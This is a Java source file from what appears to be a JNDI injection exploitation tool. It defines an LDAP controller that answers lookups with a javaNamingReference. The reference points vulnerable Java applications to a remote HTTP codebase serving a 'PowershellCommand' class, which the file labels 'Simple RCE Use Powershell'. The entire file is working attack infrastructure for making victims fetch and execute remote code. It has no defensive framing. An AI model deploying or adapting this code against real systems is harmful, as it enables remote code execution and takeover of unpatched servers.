package org.sec.controller;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.sec.Config;
import org.sec.core.ldap.LdapController;
import org.sec.core.ldap.LdapMapping;

import java.net.URL;

@LdapMapping(uri = "/PowershellCommand")
public class PowershellCommandController implements LdapController {
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        URL codeBase = new URL("http://0.0.0.0:"+ Config.httpPort +"/#PowershellCommand");
        Entry e = new Entry(base);
        e.addAttribute("objectClass", "javaNamingReference");
        e.addAttribute("javaClassName", "PowershellCommand");
        e.addAttribute("javaFactory", codeBase.getRef());
        e.addAttribute("javaCodeBase", codeBase.toString());
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public String getInfo() {
        return "Simple RCE Use Powershell";
    }
}
